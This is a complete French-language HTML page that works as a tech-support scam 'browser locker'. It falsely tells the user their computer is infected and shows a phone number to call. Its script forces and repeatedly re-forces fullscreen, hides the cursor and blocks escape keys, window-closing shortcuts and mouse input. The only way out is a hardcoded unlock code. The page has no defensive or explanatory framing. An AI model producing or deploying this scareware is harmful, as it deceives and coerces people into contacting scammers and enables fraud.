<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alerte Système</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            cursor: none; /* Désactive totalement le pointeur */
        }
        html, body {
            width: 100vw;
            height: 100vh;
            background: black;
            color: white;
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
            height: 100%;
            padding: 5%;
        }
        .message {
            font-size: 5vw;
            font-weight: bold;
        }
        .alert-number {
            font-size: 4vw;
            font-weight: bold;
            color: red;
        }
        #codeInput {
            margin-top: 20px;
            padding: 15px;
            font-size: 3vw;
            text-align: center;
            border: 3px solid white;
            width: 50%;
            background: black;
            color: white;
            outline: none;
        }
        #error-message {
            color: red;
            font-size: 2vw;
            margin-top: 10px;
            animation: shake 0.5s;
            animation-iteration-count: 1;
        }
        @keyframes shake {
            0% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            50% { transform: translateX(5px); }
            75% { transform: translateX(-5px); }
            100% { transform: translateX(0); }
        }
        .glitch {
            position: relative;
            color: white;
            font-size: 3vw;
            animation: glitch 1s infinite;
        }
        @keyframes glitch {
            0% {
                text-shadow: 2px 2px red, -2px -2px blue;
            }
            25% {
                text-shadow: -2px 2px red, 2px -2px blue;
            }
            50% {
                text-shadow: 2px -2px red, -2px 2px blue;
            }
            75% {
                text-shadow: -2px -2px red, 2px 2px blue;
            }
            100% {
                text-shadow: 2px 2px red, -2px -2px blue;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <p class="message">  Votre ordinateur est infecté  <br>Appelez immédiatement :</p>
        <p class="alert-number">+33 7 56 75 43 88</p>
        <p style="font-size: 3vw;">Entrez le code de déverrouillage :</p>
        <input type="password" id="codeInput" placeholder="Code secret">
        <p id="error-message" class="glitch"></p>
    </div>
    <audio id="keypress-sound">
        <source src="https://www.soundjay.com/button/beep-07.wav" type="audio/wav">
    </audio>
    <audio id="error-sound">
        <source src="https://www.soundjay.com/button/beep-10.wav" type="audio/wav">
    </audio>
    <script>
        function openFullscreen() {
            let elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.mozRequestFullScreen) {
                elem.mozRequestFullScreen();
            } else if (elem.webkitRequestFullscreen) {
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) {
                elem.msRequestFullscreen();
            }
        }
        openFullscreen();

        // Bloquer tous les raccourcis clavier
        document.addEventListener("keydown", function(event) {
            let blockedKeys = ["Escape", "Tab", "F11", "F4", "Alt", "Control", "Meta"];
            if (blockedKeys.includes(event.key) || (event.ctrlKey && event.key === "w")) {
                event.preventDefault();
                return false;
            }
        });

        // Désactiver totalement la touche Échap
        window.addEventListener("keydown", function(event) {
            if (event.key === "Escape") {
                event.preventDefault();
                return false;
            }
        });

        // Désactiver complètement la souris
        window.addEventListener("mousemove", function(event) {
            event.preventDefault();
        });
        window.addEventListener("mousedown", function(event) {
            event.preventDefault();
        });
        window.addEventListener("mouseup", function(event) {
            event.preventDefault();
        });
        window.addEventListener("contextmenu", function(event) {
            event.preventDefault();
        });
        window.addEventListener("wheel", function(event) {
            event.preventDefault();
        });

        // Empêcher la sortie du plein écran
        document.addEventListener("fullscreenchange", function() {
            if (!document.fullscreenElement) {
                openFullscreen();
            }
        });

        // Ajouter un son à chaque touche pressée
        let inputField = document.getElementById("codeInput");
        let errorMessage = document.getElementById("error-message");
        let sound = document.getElementById("keypress-sound");
        let errorSound = document.getElementById("error-sound");

        inputField.addEventListener("keydown", function(event) {
            if (!["Enter", "Backspace"].includes(event.key)) {
                sound.play();
            }
        });

        // Vérifier le code
        inputField.addEventListener("keyup", function(event) {
            if (event.key === "Enter") {
                if (this.value === "1234") {
                    document.body.innerHTML = "<h1 style='color: white; text-align: center; margin-top: 20%; font-size: 5vw;'>  Système restauré</h1>";
                } else {
                    errorMessage.innerText = "Code incorrect !";
                    errorMessage.classList.remove("glitch");
                    void errorMessage.offsetWidth; // Reset animation
                    errorMessage.classList.add("glitch");
                    errorSound.play();
                    this.value = "";
                }
            }
        });

        // Focus automatique sur le champ
        window.onload = function() {
            inputField.focus();
        };

        // Reforcer le plein écran toutes les 2 secondes
        setInterval(openFullscreen, 2000);
    </script>
</body>
</html>
